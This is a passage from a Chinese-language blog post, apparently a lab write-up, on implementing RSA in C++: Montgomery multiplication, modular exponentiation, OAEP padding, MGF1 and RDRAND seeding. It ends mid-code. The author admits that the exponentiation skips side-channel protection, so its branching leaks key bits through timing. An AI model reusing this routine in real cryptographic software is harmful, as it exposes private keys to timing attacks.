class=\"mord\">⊗</span></span></span></span> 可以通过这样实现：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>a</mi><mo>⊗</mo><mi>b</mi><mo>=</mo><mi>a</mi><mi>b</mi><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo>=</mo><mfrac><mrow><mi>a</mi><mi>b</mi><msup><mi>R</mi><mn>2</mn></msup></mrow><msup><mi>R</mi><mn>2</mn></msup></mfrac><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mfrac><mrow><mi>a</mi><mo>⋅</mo><msup><mi>R</mi><mn>2</mn></msup></mrow><mi>R</mi></mfrac><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi><mo stretchy=\"false\">)</mo><mo>⋅</mo><mfrac><mi>b</mi><mi>R</mi></mfrac><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">a\\otimes b=ab\\bmod p=\\frac{abR^2}{R^2}\\bmod p=(\\frac{a\\cdot R^2}{R}\\bmod p)\\cdot\\frac{b}{R}\\bmod p\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.177108em;vertical-align:-0.686em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.491108em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.740108em;\"><span style=\"top:-2.9890000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">b</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.177108em;vertical-align:-0.686em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.491108em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.05744em;vertical-align:-0.686em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.37144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.686em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span></span></p>\n<p>也就是两次 Montgomery Multiplication 运算就可以完成。第一次是对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>R</mi><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">R^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span>，第二次是对上一个结果和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span>。</p>\n<p>我对它的实现如下：（采用了面向对象设计）</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Int <span class=\"keyword\">operator</span>*(<span class=\"type\">const</span> Int&amp; other) <span class=\"type\">const</span> &#123;</span><br><span class=\"line\">  Int aR = <span class=\"keyword\">this</span>-&gt;<span class=\"built_in\">MontgomeryMultiply</span>(F.R2modp);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> aR.<span class=\"built_in\">MontgomeryMultiply</span>(other.a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"模指数\"><a class=\"anchor\" href=\"#模指数\">#</a> 模指数</h2>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>a</mi><mi>b</mi></msup><mtext> </mtext><mo lspace=\"0.22em\" rspace=\"0.22em\"><mrow><mi mathvariant=\"normal\">m</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">d</mi></mrow></mo><mtext> </mtext><mi>p</mi></mrow><annotation encoding=\"application/x-tex\">a^b\\bmod p</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.849108em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.849108em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">b</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\"><span class=\"mord\"><span class=\"mord mathrm\">m</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">d</span></span></span><span class=\"mspace\" style=\"margin-right:0.05555555555555555em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span></span></span></span> 采用从 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span></span></span></span> 最高位开始，逐位对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span></span></span></span> 执行平方和乘法实现，这里我的平方复用乘法实现。我只考虑性能，没有采取抗侧信道攻击的平方乘法都执行的方式。实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Int <span class=\"keyword\">operator</span>^(<span class=\"type\">const</span> Int&amp; other) <span class=\"type\">const</span> &#123;</span><br><span class=\"line\">  <span class=\"function\">Int <span class=\"title\">c</span><span class=\"params\">(F)</span>, <span class=\"title\">tmp</span><span class=\"params\">(F, a)</span></span>;</span><br><span class=\"line\">  Int aR = <span class=\"keyword\">this</span>-&gt;<span class=\"built_in\">MontgomeryMultiply</span>(F.R2modp);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(*<span class=\"keyword\">this</span> == c) <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">  c.a[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"type\">bool</span> start = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">31</span>; i &gt;= <span class=\"number\">0</span>; --i)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j = <span class=\"number\">63</span>; j &gt;= <span class=\"number\">0</span>; --j)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(start)&#123;</span><br><span class=\"line\">      c = c * c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(other.a[i] &amp; (<span class=\"number\">1ULL</span> &lt;&lt; j))&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span>(!start)&#123;</span><br><span class=\"line\">        start = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        c = *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        c = c.<span class=\"built_in\">MontgomeryMultiply</span>(aR.a);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"oaep-填充\"><a class=\"anchor\" href=\"#oaep-填充\">#</a> OAEP 填充</h1>\n<p><img data-src=\"/assets/math/cryptography/rsa/1.png\" alt=\"MGF1\" /></p>\n<p>注意到需要对  <code>Seed</code>  和  <code>MaskedDB</code>  作为输入进行 MGF 哈希，MGF 哈希还需要在输入后面填充 4 个字节的计数，所以我干脆直接将这两个变量的存储就声明多了这 4 字节填充：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint8_t</span> xSeed[<span class=\"number\">36</span>];             <span class=\"comment\">// 32 + 4 = 36</span></span><br><span class=\"line\"><span class=\"type\">uint8_t</span> xMaskedDB[<span class=\"number\">227</span>] = &#123;<span class=\"number\">0</span>&#125;;  <span class=\"comment\">// 256 - 32 - 1 + 4 = 227</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"mgf1\"><a class=\"anchor\" href=\"#mgf1\">#</a> MGF1</h2>\n<p>利用上一个实验完成的 SHA-256 作为哈希函数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi></mrow><annotation encoding=\"application/x-tex\">H</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span></span></span></span>。</p>\n<ul>\n<li>设置一个从 0 开始、用 4 字节的大端序表示的计数器 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">c</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span></span></span></span> ，将输出设为空数据</li>\n<li>不断在输出上拼接 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>m</mi><mo>∣</mo><mo>∣</mo><mi>c</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(m∣∣c)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∣</span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mrel\">∣</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mclose\">)</span></span></span></span> 并增加计数（<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo>←</mo><mi>c</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">c\\gets c+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">←</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span>），直到输出达到指定的长度为止，然后截断多余的部分</li>\n</ul>\n<p>实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">MGF</span><span class=\"params\">(<span class=\"type\">uint8_t</span> * xin, <span class=\"type\">uint32_t</span> ilen, <span class=\"type\">uint8_t</span> * out, <span class=\"type\">uint32_t</span> olen)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">uint32_t</span> t = olen / <span class=\"number\">32</span>;</span><br><span class=\"line\">  <span class=\"type\">uint32_t</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"type\">uint8_t</span> * bytes_i = (<span class=\"type\">uint8_t</span> *)(&amp;i);</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(; i &lt; t; ++i)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">4</span>; ++j)&#123;</span><br><span class=\"line\">      xin[ilen + j] = bytes_i[<span class=\"number\">3</span> - j];  <span class=\"comment\">// 小端存储的计数转化为大端</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">sha256</span>(out + i * <span class=\"number\">32</span>, xin, ilen + <span class=\"number\">4</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(olen % <span class=\"number\">32</span> != <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> buffer[<span class=\"number\">32</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">4</span>; ++j)&#123;</span><br><span class=\"line\">      xin[ilen + j] = bytes_i[<span class=\"number\">3</span> - j];  <span class=\"comment\">// 小端存储的计数转化为大端</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">sha256</span>(buffer, xin, ilen + <span class=\"number\">4</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(out + i * <span class=\"number\">32</span>, buffer, olen % <span class=\"number\">32</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里我的输入  <code>xin</code>  都是有声明多余 4 个字节供计数填充的。</p>\n<h2 id=\"hashl\"><a class=\"anchor\" href=\"#hashl\">#</a> Hash(L)</h2>\n<p>注意到实验输入 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">L</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span> 始终为空，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>L</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(L)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">L</span><span class=\"mclose\">)</span></span></span></span> 结果是固定的，所以干脆直接硬编码了这个结果：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint8_t</span> HashedL[<span class=\"number\">32</span>] = &#123;</span><br><span class=\"line\">    <span class=\"number\">0xe3</span>, <span class=\"number\">0xb0</span>, <span class=\"number\">0xc4</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x98</span>, <span class=\"number\">0xfc</span>, <span class=\"number\">0x1c</span>, <span class=\"number\">0x14</span>,</span><br><span class=\"line\">    <span class=\"number\">0x9a</span>, <span class=\"number\">0xfb</span>, <span class=\"number\">0xf4</span>, <span class=\"number\">0xc8</span>, <span class=\"number\">0x99</span>, <span class=\"number\">0x6f</span>, <span class=\"number\">0xb9</span>, <span class=\"number\">0x24</span>,</span><br><span class=\"line\">    <span class=\"number\">0x27</span>, <span class=\"number\">0xae</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0xe4</span>, <span class=\"number\">0x64</span>, <span class=\"number\">0x9b</span>, <span class=\"number\">0x93</span>, <span class=\"number\">0x4c</span>,</span><br><span class=\"line\">    <span class=\"number\">0xa4</span>, <span class=\"number\">0x95</span>, <span class=\"number\">0x99</span>, <span class=\"number\">0x1b</span>, <span class=\"number\">0x78</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0xb8</span>, <span class=\"number\">0x55</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"随机种子生成\"><a class=\"anchor\" href=\"#随机种子生成\">#</a> 随机种子生成</h2>\n<p>利用 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW50ZWwuY29tL2NvbnRlbnQvd3d3L3VzL2VuL2RvY3MvY3BwLWNvbXBpbGVyL2RldmVsb3Blci1ndWlkZS1yZWZlcmVuY2UvMjAyMS04L3JkcmFuZDE2LXN0ZXAtcmRyYW5kMzItc3RlcC1yZHJhbmQ2NC1zdGVwLmh0bWw=\">x64 CPU 的 RDRAND 指令</span> 实现如下：</p>\n<p><figure class=\"highlight cpp\"><figcaption><span>cpp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint8_t</span> xSeed[<span class=\"number\">36</span>];  <span class=\"comment\">// 32 + 4 = 36</span></span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; ++i)&#123;</span><br><span class=\"line\">  <span class=\"type\">uint64_t</span> randomValue;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span> status;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">asm</span> <span class=\"title\">volatile</span> <span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"string\">&quot;rdrand 